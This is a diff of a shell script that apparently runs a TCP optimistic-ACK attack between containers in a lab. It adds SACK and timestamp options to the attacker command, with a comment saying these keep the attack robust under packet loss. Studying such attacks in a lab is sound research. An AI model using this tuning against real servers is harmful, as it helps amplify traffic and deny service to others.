@@ -68,7 +68,12 @@ sleep 2
 # --- attack: optimistic-ACK tool for DURATION seconds, with a mid-run ss snapshot ---
 echo "[*] Optimistic-ACK attack (${DURATION}s)..."
 A0=$(server_outoctets)
-dc exec -T attacker /work/attack --target server --port 5000 --duration "${DURATION}" >/dev/null 2>&1 &
+# Negotiate SACK + timestamps, exactly as a real modern TCP receiver does. The
+# M3 sweep (scripts/sweep.py) shows this is also what keeps the attack robust
+# under loss: without SACK the overrun-recovery ACKs look like duplicates to
+# NewReno and the window collapses; with it the server holds the window open.
+dc exec -T attacker /work/attack --target server --port 5000 \
+   --duration "${DURATION}" --sack --timestamps >/dev/null 2>&1 &
 APID=$!
 sleep "$(python3 -c "print(max(int($DURATION/2),2))")"
 echo "[*] server ss -ti mid-attack (expect huge cwnd, tiny rtt):"
